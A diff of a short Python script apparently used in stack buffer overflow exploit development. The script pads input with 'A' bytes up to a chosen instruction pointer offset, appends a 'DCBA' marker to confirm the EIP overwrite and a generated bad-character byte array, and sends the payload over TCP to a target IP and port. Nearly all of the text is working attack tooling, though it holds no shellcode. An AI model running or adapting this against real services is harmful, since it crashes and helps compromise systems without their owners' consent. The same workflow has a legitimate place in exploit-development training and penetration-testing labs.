@@ -3,13 +3,12 @@
 import socket
 import argparse
 
-def gen_badchars(known: str = ""):
-    known = known
+def gen_badchars(known):
     byte_array = ""
     for i in range(1,256):
         char = chr(i)
         if char not in known:
-            byte_array += chr(i)
+            byte_array += char
     return bytes(byte_array, "utf8")
 
 
@@ -17,12 +16,11 @@ args = argparse.ArgumentParser()
 args.add_argument("ip", help="The IP to send byte array to.")
 args.add_argument("port", help="The port to send pattern to.", type=int)
 args.add_argument("offset", help="Offset of Instruction Pointer", type=int)
-args.add_argument("-cbp", help='Known bad chars. eg "\x00\x12\xca"')
+args.add_argument("-b", help='Known bad chars. eg "\x00\x12\xca"')
 args = args.parse_args()
 
-
-payload = (b"A" * args.offset) + gen_badchars(args.cbp)
-
+known = args.b if args.b else ""
+payload = (b"A" * args.offset) + b"DCBA" + gen_badchars(known) # confirm EIP overwrite
 
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
